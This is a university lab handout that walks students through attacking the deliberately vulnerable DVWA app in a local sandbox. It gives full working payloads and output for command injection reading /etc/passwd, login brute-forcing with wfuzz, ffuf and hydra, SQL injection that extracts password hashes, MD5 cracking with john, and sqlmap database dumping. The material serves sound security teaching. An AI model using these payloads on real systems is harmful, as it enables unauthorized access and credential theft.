# PB177 – Web Application Attacks – Part I

[[_TOC_]]

## Learning Objectives

At the end of this lab session, you will be able to:
- understand and exploit command injection vulnerabilities,
- perform brute-force attacks on basic web authentication systems,
- conduct SQL injection attacks to retrieve sensitive data,
- crack MD5 password hashes,
- utilize command-line tools such as curl, wfuzz, hydra, and sqlmap for web application penetration testing.

## Sandbox

In this lab, you will use the [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA), an intentionally insecure web environment designed for learning and practicing web application security. DVWA provides a controlled environment where you can explore and test various web vulnerabilities. This hands-on training will help you build skills in exploiting and defending against common security issues using practical tools and techniques.

## Start the Sandbox

1. Update the repository by running `git pull` in `labs` directory. Go to `5` directory.
1. Login to get access to Podman images: `podman login gitlab.fi.muni.cz:5050`.
1. Run `podman-compose pull` to download images used in this lab.
1. Run `podman-compose up -d`.
1. [Check you can access Kali container using terminal and RDP](../1/index.md#start-the-sandbox). This lab uses three containers, `podman-compose ps -q | wc -l` should display `3`.
1. You can access the DVWA web interface on your desktop by opening a web browser and navigating to http://localhost:4280/.
1. **Setup the DVWA DB: go to http://10.0.0.10/setup.php and click the "Create / Reset Database" button. You should see "Setup successful!".** 

## Web Attacks

### Task: Command Injection

In this task, you will exploit the DVWA page by targeting input fields with insufficient protection. Start with [Command Injection](https://owasp.org/www-community/attacks/Command_Injection) at the *Command Injection* tab.

On this page, you will find a simple input box meant for pinging a device (use target IP 10.0.0.254). Your goal is to experiment by entering commands that not only perform the intended `ping` but also execute unauthorized commands, such as displaying the contents of the `/etc/passwd` file.

* Navigate to http://10.0.0.10/vulnerabilities/exec/
* Craft an input to display the contents of the /etc/passwd file.
* Identify the User ID of the user with the username **games**.

<details open>
<summary>
Source code and chaining commands
</summary>

 * Think how this service could be *implemented* in the backend (use **View Source** at the bottom of the Command Injection page).
 ```php
 $cmd = shell_exec( 'ping  -c 4 ' . $target );
 ```
 * Think about how to *chain shell commands* in Linux (use **View Help** at the bottom of the Command Injection page).
```shell-session
root@attacker:~# ping -c 1 10.0.0.254 && echo "Host is ONLINE" || echo "Host is OFFLINE"
```
</details>

<details open>
<summary>
What is the format of /etc/passwd file?
</summary>

 * The format of /etc/passwd is: **`Username:Password:UserID:GroupID...`**
</details>

<details open>
<summary>
Solution
</summary>

You should enter **10.0.0.254; cat /etc/passwd** to get the contents of /etc/passwd file.
Enter the following command to retrieve the contents of the /etc/passwd file:
```
10.0.0.254; cat /etc/passwd
```
Executing this input should display the file contents.

```shell-session
PING 10.0.0.254 (10.0.0.254) 56(84) bytes of data.
64 bytes from 10.0.0.254: icmp_seq=1 ttl=64 time=0.135 ms
64 bytes from 10.0.0.254: icmp_seq=2 ttl=64 time=0.157 ms
64 bytes from 10.0.0.254: icmp_seq=3 ttl=64 time=0.040 ms
64 bytes from 10.0.0.254: icmp_seq=4 ttl=64 time=0.179 ms

--- 10.0.0.254 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3105ms
rtt min/avg/max/mdev = 0.040/0.127/0.179/0.053 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

The format of /etc/passwd is: **`Username:Password:User ID: Group ID...`**

`games:x:` **`5`** `:60:games:/usr/games:/usr/sbin/nologin`


The UserID is: **5**

Attacker command line solution

```shell-session
root@attacker:~# curl -s http://10.0.0.10:80/vulnerabilities/exec/ -X POST --data-raw 'ip=10.0.0.254;cat /etc/passwd&Submit=Submit' | lynx -nolist -dump -stdin | grep games
games:x:5:60:games:/usr/games:/usr/sbin/nologin
```
</details>

Watch [this video](https://www.youtube.com/watch?v=8HBwuT5LXvM) on how command injection works in DVWA if you need further understanding. An advanced description (recommended reading) of various command injection techniques is available [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).

### Task: Brute Force Using curl and wfuzz

In this task, you will brute force web application authentication. These attacks are usually sent via GET and POST requests to the server. Start with [Brute Force attack](https://owasp.org/www-community/attacks/Brute_force_attack) at the *Brute Force* tab.

* Navigate to http://10.0.0.10/vulnerabilities/brute/
  - What is the **type** of **request**?
  - How are the **log in parameters** handled?
* Try logging in to the Firefox browser as the user **admin** and guessing the password. Use the Firefox built-in functionality `Tools -> Browser Tools -> Web Developer Tools` to analyze the network traffic.
* Prepare a dictionary file on your attack machine. Use the [wordlist.txt](./wordlist.txt) to log in to the website.
* Use the [wfuzz](https://wfuzz.readthedocs.io/en/latest/) tool to brute force the web login using the wordlist.

<details open>
<summary>
What is the HTTP request to login to the web site?
</summary>

* Web site is using a GET method to request login data.
```shell-session
root@attacker:~# curl -s http://10.0.0.10:80/vulnerabilities/brute/ | grep -A 8 'method='
		<form action="#" method="GET">
			Username:<br />
			<input type="text" name="username"><br />
			Password:<br />
			<input type="password" AUTOCOMPLETE="off" name="password"><br />
			<br />
			<input type="submit" value="Login" name="Login">

		</form>
```

* The target URL is **http://10.0.0.10:80/vulnerabilities/brute/?username=USERNAME&password=PASSWORD&Login=Login**

```shell-session
root@attacker:~# curl -s -v 'http://10.0.0.10:80/vulnerabilities/brute/?username=USERNAME&password=PASSWORD&Login=Login' > /dev/null
*   Trying 10.0.0.10:80...
* Connected to 10.0.0.10 (10.0.0.10) port 80
> GET /vulnerabilities/brute/?username=USERNAME&password=PASSWORD&Login=Login HTTP/1.1
> Host: 10.0.0.10
> User-Agent: curl/8.9.1
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Thu, 14 Nov 2024 14:40:17 GMT
< Server: Apache/2.4.62 (Debian)
< X-Powered-By: PHP/8.3.13
< Set-Cookie: security=low; path=/
< Set-Cookie: PHPSESSID=439426a32a852fe4f2ea119c2fff2222; expires=Fri, 15 Nov 2024 14:40:17 GMT; Max-Age=86400; path=/
< Expires: Tue, 23 Jun 2009 12:00:00 GMT
< Cache-Control: no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 4288
< Content-Type: text/html;charset=utf-8
<
{ [4288 bytes data]
* Connection #0 to host 10.0.0.10 left intact
```
</details>

<details open>
<summary>
Solution for performing brute force attack with wfuzz
</summary>

Performe brute force using wfuzz

```shell-session
root@attacker:~# wfuzz -z file,wordlist.txt 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login
Total requests: 5

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000003:   200        109 L    251 W      4288 Ch     "12345"
000000002:   200        109 L    251 W      4288 Ch     "root"
000000004:   200        109 L    255 W      4326 Ch     "password"
000000005:   200        109 L    251 W      4288 Ch     "qwerty"
000000001:   200        109 L    251 W      4288 Ch     "admin"

```

Look at the size of the website's response. After a successful login using the correct password, the website's response is larger (4326 characters).

Verify the login using curl and lynx

```shell-session
root@attacker:~# curl -s 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=password&Login=Login' | lynx -nolist -dump -stdin
```

and you should see

```shell-session
Vulnerability: Brute Force

Login

   Username:
   ____________________
   Password:
   ____________________
   Login

   Welcome to the password protected area admin
   [admin.jpg]
```

Now that we know the website's response after a successful login, we'll adjust the wfuzz parameters to identify and display only the valid user password. Use the `--ss` option to set the regex and show responses that contain the message: **Welcome to the password-protected area**.

```shell-session
root@attacker:~# wfuzz --ss "Welcome to the password protected area" -z file,wordlist.txt 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login
Total requests: 5

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000004:   200        109 L    255 W      4326 Ch     "password"

```

In the next step, we will use a similar approach to filter out incorrect login attempts by targeting responses with the message: **Username and/or password incorrect**. Use the `--hs` option to set the regex and exclude these responses.

```shell-session
root@attacker:~# wfuzz --hs "Username and/or password incorrect" -z file,wordlist.txt 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login
Total requests: 5

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000004:   200        109 L    255 W      4326 Ch     "password"

```

</details>


<details open>
<summary>
Bonus task - performing brute force attack with ffuf
</summary>

[ffuf](https://github.com/ffuf/ffuf) works similarly to `wfuzz`, making it a reliable choice for web fuzzing. In this bonus task, we’ll walk through two examples using regex filters in `ffuf` to handle login scenarios, showing how to leverage both success and failure messages during website authentication.

Perform brute force using `ffuf` and use the failure message (regex set with `-fr` option).

```shell-session
root@attacker:~# ffuf -w wordlist.txt -fr "Username and/or password incorrect." -u 'http://10.0.0.10:80/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.0.10:80/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login
 :: Wordlist         : FUZZ: /root/wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Username and/or password incorrect.
________________________________________________

password                [Status: 200, Size: 4326, Words: 178, Lines: 110, Duration: 4ms]
```

Perform brute force using `ffuf` and use the success message (regex set with `-mr` option).

```shell-session
root@attacker:~# ffuf -w wordlist.txt -mr "Welcome to the password protected area" -u 'http://10.0.0.10:80/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.0.10:80/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login
 :: Wordlist         : FUZZ: /root/wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Welcome to the password protected area
________________________________________________

password                [Status: 200, Size: 4326, Words: 178, Lines: 110, Duration: 5ms]
```

</details>

### Task: Brute Force Using hydra

In this task, you will perform a similar process to the previous task but using the `hydra` tool.

If you have never used hydra before, a quick [tutorial](https://www.youtube.com/watch?v=YrMNih3Z-4Y) is available to get you familiar. For detailed information on the **http-get-form** brute force type of attack, use `hydra -U http-get-form`. You can also visit hydra's official [website](https://www.kali.org/tools/hydra/) for more comprehensive documentation.

Focus on these key points:

* How to specify a target user (or multiple users) for brute-forcing their password.
* How to provide a file containing the passwords to be tested during the attack.
* The required parameters for running the command with the http-get-form type.

<details open>
<summary>
Analyze the server response and how the server responds when an incorrect password is used.
</summary>

 * Use `curl` to make login attempt with incorrect password. Look for unique messages, status codes, or elements in the response body that indicate a failed login.

 ```shell-session
root@attacker:~# curl -s 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=WRONG-PASSWORD&Login=Login' | lynx -nolist -dump -stdin

Vulnerability: Brute Force

Login

   Username:
   ____________________
   Password:
   ____________________
   Login
Username and/or password incorrect.

```
* The web server returns a unique error message **Username and/or password incorrect.**
</details>

<details open>
<summary>
Specify the success or failure condition using the http-get-form parameters.
</summary>

 * `//10.0.0.10:80/vulnerabilities/brute/` : The login page.
 * `username=^USER^&password=^PASS^&Login=Login` : The form fields used for submitting login credentials (username and password).
 * `F=Invalid password message` : The failure condition, specified by the message seen in the server's response.
 * `S=Correct password message` : The success condition, specified by the message seen in the server's response.

 All these options are combined into a single command as follows:
* `http-get-form://URL:username=^USER^&password=^PASS^&Login=Login:F=TEXT`

</details>

<details open>
<summary>
Solution
</summary>

Perform brute force using Hydra and use the failure condition.

```shell-session
root@attacker:~# hydra -l admin -P wordlist.txt 'http-get-form://10.0.0.10:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-16 10:38:22
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
[DATA] attacking http-get-form://10.0.0.10:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.
[80][http-get-form] host: 10.0.0.10   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-16 10:38:22
```

Perform brute force using Hydra and use the success condition.

```shell-session
root@attacker:~# hydra -l admin -P wordlist.txt 'http-get-form://10.0.0.10:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area admin'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-16 10:43:25
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
[DATA] attacking http-get-form://10.0.0.10:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area admin
[80][http-get-form] host: 10.0.0.10   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-16 10:43:25
```

Verify the login using curl and lynx

```shell-session
root@attacker:~# curl -s 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=password&Login=Login' | lynx -nolist -dump -stdin
```

</details>

### Task: SQL Injection

In this task, you will use [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) to read sensitive data from the database. A comprehensive description of various command injection techniques is available [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection). Start with injection at the *SQL Injection* tab.

* Navigate to http://10.0.0.10/vulnerabilities/sqli/
* Identify vulnerable entry points.
* Use various SQL injection techniques to explore and retrieve data.

There are five users in the database, with id's from 1 to 5. Your mission is to steal their passwords via SQL injection. The SQL query uses raw input that is directly controlled by you. All you need to do is escape the query, allowing you to execute any SQL query you wish.

The DVWA source code uses the following SQL query to read first and last names.

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

<details open>
<summary>
Show first and last names of users with IDs 1 to 5.
</summary>

 * Use the Firefox browser or `curl` to read users' first and last names by entering the respective number in each query.

 ```shell-session
root@attacker:~# curl -s "http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit" | lynx -nolist -dump -stdin

Vulnerability: SQL Injection

   User ID: _______________ Submit
ID: 1
First name: admin
Surname: admin

```
</details>

<details open>
<summary>
Show all first and last names using a single query.
</summary>

 * Use the Firefox browser or `curl` to request all first and last names using the following query: **1' OR '2'='2**

 ```shell-session
root@attacker:~# curl -s --get --data-urlencode "id=1' OR '2'='2" http://10.0.0.10:80/vulnerabilities/sqli/?Submit=Submit | lynx -nolist -dump -stdin

Vulnerability: SQL Injection

   User ID: _______________ Submit
ID: 1' OR '2'='2
First name: admin
Surname: admin
ID: 1' OR '2'='2
First name: Gordon
Surname: Brown
ID: 1' OR '2'='2
First name: Hack
Surname: Me
ID: 1' OR '2'='2
First name: Pablo
Surname: Picasso
ID: 1' OR '2'='2
First name: Bob
Surname: Smith

```
 * Propose and test multiple always-true SQL statements to list all first and last names in the database (e.g, `' OR 1=1 -- COMMENT`).
</details>

<details open>
<summary>
Extract the user names and passwords stored in the database.
</summary>

 * Use the Firefox browser or `curl` to extract the user names and passwords stored in the database using the following query: **'UNION SELECT user, password FROM users #**

 ```shell-session
root@attacker:~# curl -s --get --data-urlencode "id='UNION SELECT user, password FROM users #" http://10.0.0.10:80/vulnerabilities/sqli/?Submit=Submit | lynx -nolist -dump -stdin

Vulnerability: SQL Injection

   User ID: _______________ Submit
ID: 'UNION SELECT user, password FROM users #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 'UNION SELECT user, password FROM users #
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID: 'UNION SELECT user, password FROM users #
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 'UNION SELECT user, password FROM users #
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 'UNION SELECT user, password FROM users #
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```
</details>

<details open>
<summary>
Crack the hashes to obtain the passwords in plaintext.
</summary>

 * Create the password file using the extracted usernames and MD5 hashes from the database.
```shell-session
root@attacker:~# cat passwords.txt
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```
 * Crack the passwords using known wordlist.
```shell-session
root@attacker:~# john --format=raw-md5 --wordlist=/usr/share/wordlists/sqlmap.txt passwords.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
abc123           (gordonb)
charley          (1337)
letmein          (pablo)
password         (admin)
4g 0:00:00:00 DONE (2024-11-16 18:33) 80.00g/s 24760Kp/s 24760Kc/s 65556KC/s passmenow..pastoor1
Warning: passwords printed above might not be all those cracked
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
  * Show the discovered passwords; it is worth noting that the users 'admin' and 'smithy' are using the same password.
```shell-session
root@attacker:~# john --show --format=Raw-MD5 passwords.txt
admin:password
gordonb:abc123
1337:charley
pablo:letmein
smithy:password

5 password hashes cracked, 0 left
```
 * Verify the login using hydra

```shell-session
root@attacker:~# john --show --format=Raw-MD5 passwords.txt | grep : | cut -d ':' -f 1 > userlist.txt
root@attacker:~# john --show --format=Raw-MD5 passwords.txt | grep : | cut -d ':' -f 2 | sort | uniq > passlist.txt
root@attacker:~# hydra -L userlist.txt -P passlist.txt 'http-get-form://10.0.0.10:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-16 19:03:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking http-get-form://10.0.0.10:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.
[80][http-get-form] host: 10.0.0.10   login: gordonb   password: abc123
[80][http-get-form] host: 10.0.0.10   login: admin   password: password
[80][http-get-form] host: 10.0.0.10   login: 1337   password: charley
[80][http-get-form] host: 10.0.0.10   login: pablo   password: letmein
[80][http-get-form] host: 10.0.0.10   login: smithy   password: password
1 of 1 target successfully completed, 5 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-16 19:03:46
```
</details>

<details open>
<summary>
Retrieve metadata about the database, server, and user environment.
</summary>

 * Use the Firefox browser or `curl` to Retrieve metadata about the database, server, session, and user environment using the following [Information Functions](https://mariadb.com/kb/en/information-functions/):
   * `SELECT DATABASE();` – displays the name of the current database.
   * `SELECT VERSION();` – retrieves the SQL server version.
   * `SELECT USER();` – shows the current user logged into the database.

 ```shell-session
root@attacker:~# curl -s --get --data-urlencode "id=' UNION SELECT NULL, DATABASE() -- " http://10.0.0.10:80/vulnerabilities/sqli/?Submit=Submit | lynx -dump -stdin | grep Surname
Surname: dvwa
root@attacker:~# curl -s --get --data-urlencode "id=' UNION SELECT NULL, VERSION() -- " http://10.0.0.10:80/vulnerabilities/sqli/?Submit=Submit | lynx -dump -stdin | grep Surname
Surname: 10.11.10-MariaDB-ubu2204
root@attacker:~# curl -s --get --data-urlencode "id=' UNION SELECT NULL, USER() -- " http://10.0.0.10:80/vulnerabilities/sqli/?Submit=Submit | lynx -dump -stdin | grep Surname
Surname: dvwa@10.0.0.10
```
</details>

### Task: SQL Injection Using sqlmap

In this task, you will perform a similar process to the previous task but using the `sqlmap` tool.

If you have never used sqlmap before, a [tutorial](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap.md) is available to get you familiar. You can also visit sqlmap's official [website](https://sqlmap.org/) for more comprehensive documentation.

<details open>
<summary>
Test SQL injection on GET parameter 'id'.
</summary>

 * Use `sqlmap` to identify the injection point(s).
 ```shell-session
root@attacker:~# sqlmap -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit'
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:00:32 /2024-11-17/

[10:00:32] [INFO] testing connection to the target URL
...
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 154 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 4279=4279#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 7486 FROM(SELECT COUNT(*),CONCAT(0x717a717a71,(SELECT (ELT(7486=7486,1))),0x716b6b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nBQx&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 4752 FROM (SELECT(SLEEP(5)))yTyH)-- cWrW&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x717a717a71,0x79614f4f754f6676424b6e71466d466e7351664f557462674c754e68526a624b4b5764434a6a5543,0x716b6b7071)#&Submit=Submit
---
[10:00:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP 8.3.13
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 ```
</details>

<details open>
<summary>
Retrieve current database name.
</summary>

 * Use `--current-db` option to retrieve current database name.
 ```shell-session
root@attacker:~# sqlmap -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit' --current-db
...
[10:09:08] [INFO] fetching current database
[10:09:08] [WARNING] reflective value(s) found and filtering out
current database: 'dvwa'

 ```
</details>

<details open>
<summary>
Enumerate 'dvwa' database tables.
</summary>

 * Use `--tables` and  `-D` options to enumerate `dvwa` database tables.
 ```shell-session
root@attacker:~# sqlmap -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit' -D dvwa --tables
...
[10:21:13] [INFO] fetching tables for database: 'dvwa'
[10:21:13] [WARNING] reflective value(s) found and filtering out
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+

 ```
</details>

<details open>
<summary>
Fetch columns for table 'users' in database 'dvwa'.
</summary>

 * Use `--columns`, `-D` and  `-T` options to enumerate `users` table columns.
 ```shell-session
root@attacker:~# sqlmap -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit' -D dvwa -T users --columns
...
[10:38:43] [INFO] fetching columns for table 'users' in database 'dvwa'
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+

 ```
</details>

<details open>
<summary>
Dump 'users' database table entries and obtain the passwords in plaintext.
</summary>

 * Use `--dump`, `-D` and  `-T` options to dump `users` database table entries.
 ```shell-session
root@attacker:~# sqlmap -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit' -D dvwa -T users --dump
...
[10:46:28] [INFO] fetching columns for table 'users' in database 'dvwa'
[10:46:28] [INFO] fetching entries for table 'users' in database 'dvwa'
[10:46:28] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]

do you want to crack them via a dictionary-based attack? [Y/n/q]

[10:46:37] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>

[10:46:43] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N]

[10:46:55] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[10:46:55] [INFO] starting 12 processes
[10:46:56] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
[10:46:56] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
[10:46:57] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
[10:46:58] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
Database: dvwa
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2024-11-17 09:25:29 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2024-11-17 09:25:29 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2024-11-17 09:25:29 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2024-11-17 09:25:29 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2024-11-17 09:25:29 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

 ```
</details>

<details open>
<summary>
Execute SQL queries on a vulnerable database.
</summary>

 * Use `--sql-query` to execute SQL statement.
 ```shell-session
root@attacker:~# sqlmap --batch -v0 -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit' --sql-query "SELECT user, password FROM users"
...
SELECT user, password FROM users [5]:
[*] admin, 5f4dcc3b5aa765d61d8327deb882cf99
[*] gordonb, e99a18c428cb38d5f260853678922e03
[*] 1337, 8d3533d75ae2c3966d7e0d4fcc69216b
[*] pablo, 0d107d09f5bbe40cade3de5c71e9e9b7
[*] smithy, 5f4dcc3b5aa765d61d8327deb882cf99

root@attacker:~# sqlmap --batch -v0 -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit' --sql-query "DATABASE()"
...
DATABASE(): 'dvwa'
 ```

 * Use `--sql-shell` to directly interact with the database.
 ```shell-session
 root@attacker:~# sqlmap --batch -v0 -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit' --sql-shell
 ...
 sql-shell> SELECT * FROM users
SELECT * FROM users [5]:
[*] admin, /hackable/users/admin.jpg, 0, admin, 2024-11-25 18:15:20, admin, 5f4dcc3b5aa765d61d8327deb882cf99, 1
[*] gordonb, /hackable/users/gordonb.jpg, 0, Gordon, 2024-11-25 18:15:20, Brown, e99a18c428cb38d5f260853678922e03, 2
[*] 1337, /hackable/users/1337.jpg, 0, Hack, 2024-11-25 18:15:20, Me, 8d3533d75ae2c3966d7e0d4fcc69216b, 3
[*] pablo, /hackable/users/pablo.jpg, 0, Pablo, 2024-11-25 18:15:20, Picasso, 0d107d09f5bbe40cade3de5c71e9e9b7, 4
